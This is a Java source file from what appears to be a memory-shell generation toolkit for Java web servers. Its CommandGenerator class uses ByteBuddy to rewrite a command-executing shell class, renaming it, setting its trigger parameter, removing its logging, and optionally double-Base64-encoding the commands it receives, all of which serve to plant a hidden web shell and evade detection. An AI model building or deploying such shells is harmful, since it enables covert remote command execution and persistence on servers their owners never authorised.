package com.reajason.javaweb.memshell.generator.command;

import com.reajason.javaweb.ClassBytesShrink;
import com.reajason.javaweb.buddy.*;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.CommandConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.utils.ShellCommonUtil;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.asm.Advice;
import net.bytebuddy.asm.AsmVisitorWrapper;
import net.bytebuddy.description.modifier.Ownership;
import net.bytebuddy.description.modifier.Visibility;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.implementation.FixedValue;
import org.apache.commons.lang3.StringUtils;

import java.util.Collections;
import java.util.HashMap;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class CommandGenerator {
    private final ShellConfig shellConfig;
    private final CommandConfig commandConfig;

    public CommandGenerator(ShellConfig shellConfig, CommandConfig commandConfig) {
        this.shellConfig = shellConfig;
        this.commandConfig = commandConfig;
    }

    public DynamicType.Builder<?> getBuilder() {
        if (commandConfig.getShellClass() == null) {
            throw new IllegalArgumentException("commandConfig.getClazz() == null");
        }

        DynamicType.Builder<?> builder = new ByteBuddy()
                .redefine(commandConfig.getShellClass())
                .name(commandConfig.getShellClassName())
                .field(named("paramName")).value(commandConfig.getParamName())
                .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()));

        if (shellConfig.isJakarta()) {
            builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
        }

        if (shellConfig.isDebugOff()) {
            builder = LogRemoveMethodVisitor.extend(builder);
        }

        String shellType = shellConfig.getShellType();

        if (StringUtils.startsWith(shellType, ShellType.AGENT)) {
            builder = builder.visit(
                    new LdcReAssignVisitorWrapper(new HashMap<Object, Object>(1) {{
                        put("paramName", commandConfig.getParamName());
                    }})
            );
        }

        if (CommandConfig.Encryptor.DOUBLE_BASE64.equals(commandConfig.getEncryptor())) {
            builder = builder
                    .visit(new AsmVisitorWrapper.ForDeclaredMethods()
                            .method(named("getParam"),
                                    new MethodCallReplaceVisitorWrapper(
                                            commandConfig.getShellClassName(),
                                            Collections.singleton(ShellCommonUtil.class.getName()))
                            )
                    )
                    .defineMethod("base64DecodeToString", String.class, Visibility.PUBLIC, Ownership.STATIC)
                    .withParameters(String.class)
                    .intercept(FixedValue.nullValue())
                    .visit(Advice.to(ShellCommonUtil.Base64DecodeToStringInterceptor.class).on(named("base64DecodeToString")))
                    .visit(Advice.to(DoubleBase64ParamInterceptor.class).on(named("getParam")));
        }

        return builder;
    }

    public byte[] getBytes() {
        DynamicType.Builder<?> builder = getBuilder();
        try (DynamicType.Unloaded<?> make = builder.make()) {
            return ClassBytesShrink.shrink(make.getBytes(), shellConfig.isShrink());
        }
    }
}